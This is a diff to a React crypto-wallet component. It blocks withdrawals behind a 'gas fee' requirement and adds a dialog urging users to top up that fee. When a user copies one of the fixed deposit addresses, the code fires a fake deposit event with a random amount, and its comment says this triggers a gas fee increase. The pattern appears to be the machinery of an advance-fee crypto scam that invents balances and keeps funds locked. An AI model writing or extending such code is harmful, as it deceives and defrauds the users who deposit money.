@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { ArrowDownToLine, ArrowUpFromLine, Trophy, MessageCircle, Repeat, X, Loader2 } from "lucide-react";
+import { ArrowDownToLine, ArrowUpFromLine, Trophy, MessageCircle, Repeat, X, Loader2, AlertTriangle } from "lucide-react";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -9,6 +9,8 @@ import { toast } from "sonner";
 import { useNavigate } from "react-router-dom";
 import { useLanguage } from "@/contexts/LanguageContext";
 import { getTranslation } from '@/utils/translations';
+import { useGasFee } from '@/contexts/GasFeeContext';
+import TopUpOptions from './TopUpOptions';
 
 interface WalletActionsProps {
   className?: string;
@@ -17,12 +19,14 @@ interface WalletActionsProps {
 const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
   const [withdrawDialogOpen, setWithdrawDialogOpen] = useState(false);
   const [depositDialogOpen, setDepositDialogOpen] = useState(false);
+  const [topUpDialogOpen, setTopUpDialogOpen] = useState(false);
   const [withdrawAddress, setWithdrawAddress] = useState('');
   const [withdrawAmount, setWithdrawAmount] = useState('');
   const [loading, setLoading] = useState(false);
   const [progress, setProgress] = useState(0);
   const navigate = useNavigate();
   const { language } = useLanguage();
+  const { canWithdraw, withdrawalErrorReason } = useGasFee();
 
   // Fixed wallet addresses for deposit
   const FIXED_ADDRESSES = {
@@ -34,6 +38,18 @@ const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
   };
 
   const handleWithdraw = () => {
+    if (!canWithdraw()) {
+      // Show Top Up dialog instead if gas fee is the reason
+      const reason = withdrawalErrorReason();
+      if (reason && reason === getTranslation('noGasFee', language)) {
+        setWithdrawDialogOpen(false);
+        setTopUpDialogOpen(true);
+      } else {
+        toast.error(reason || getTranslation('withdrawalNotPossible', language));
+      }
+      return;
+    }
+
     if (!withdrawAddress || !withdrawAmount) {
       toast.error(getTranslation('fillAllFields', language));
       return;
@@ -78,6 +94,13 @@ const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
                     coin === 'ETH' ? 'Ethereum' :
                     coin === 'BNB' ? 'Binance Coin' :
                     coin === 'TRX' ? 'Tron' : 'USDT';
+
+    // Create a deposit event that will trigger the gas fee increase
+    const depositAmount = Math.random() * 100 + 10; // Random amount
+    const depositEvent = new CustomEvent('deposit', { 
+      detail: { amount: depositAmount }
+    });
+    window.dispatchEvent(depositEvent);
     
     toast.success(getTranslation('addressCopied', language), {
       description: `${coinName} ${getTranslation('addressCopiedDesc', language)}`,
@@ -119,6 +142,30 @@ const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
             </DialogDescription>
           </DialogHeader>
           <div className="space-y-4 py-4">
+            {!canWithdraw() && (
+              <div className="p-3 rounded-lg bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-700/30 flex items-start gap-2">
+                <AlertTriangle className="h-5 w-5 text-red-500 flex-shrink-0 mt-0.5" />
+                <div>
+                  <p className="text-sm font-medium text-red-700 dark:text-red-400">
+                    {getTranslation('withdrawalNotAvailable', language)}
+                  </p>
+                  <p className="text-xs text-red-600 dark:text-red-400/80 mt-1">
+                    {withdrawalErrorReason()}
+                  </p>
+                  <Button 
+                    size="sm" 
+                    className="mt-2 bg-red-600 hover:bg-red-700" 
+                    onClick={() => {
+                      setWithdrawDialogOpen(false);
+                      setTopUpDialogOpen(true);
+                    }}
+                  >
+                    {getTranslation('topUpGasFee', language)}
+                  </Button>
+                </div>
+              </div>
+            )}
+            
             <div className="space-y-2">
               <label htmlFor="address" className="text-sm font-medium">{getTranslation('walletAddress', language)}</label>
               <Input
@@ -126,7 +173,7 @@ const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
                 placeholder={getTranslation('enterAddress', language)}
                 value={withdrawAddress}
                 onChange={(e) => setWithdrawAddress(e.target.value)}
-                disabled={loading}
+                disabled={loading || !canWithdraw()}
               />
             </div>
             <div className="space-y-2">
@@ -137,7 +184,7 @@ const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
                 placeholder="0.00"
                 value={withdrawAmount}
                 onChange={(e) => setWithdrawAmount(e.target.value)}
-                disabled={loading}
+                disabled={loading || !canWithdraw()}
               />
             </div>
             {loading && (
@@ -157,7 +204,7 @@ const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
             }} disabled={loading}>
               {getTranslation('cancel', language)}
             </Button>
-            <Button onClick={handleWithdraw} disabled={loading}>
+            <Button onClick={handleWithdraw} disabled={loading || !canWithdraw()}>
               {loading ? (
                 <>
                   <Loader2 className="mr-2 h-4 w-4 animate-spin" />
@@ -210,6 +257,21 @@ const WalletActions: React.FC<WalletActionsProps> = ({ className }) => {
             <Button variant="outline" onClick={() => setDepositDialogOpen(false)}>
               {getTranslation('close', language)}
             </Button>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Gas Fee Top Up Dialog */}
+      <Dialog open={topUpDialogOpen} onOpenChange={setTopUpDialogOpen}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle>{getTranslation('topUpGasFee', language)}</DialogTitle>
+            <DialogDescription>
+              {getTranslation('topUpGasFeeDesc', language)}
+            </DialogDescription>
+          </DialogHeader>
+          <div className="py-4">
+            <TopUpOptions onClose={() => setTopUpDialogOpen(false)} />
           </div>
         </DialogContent>
       </Dialog>
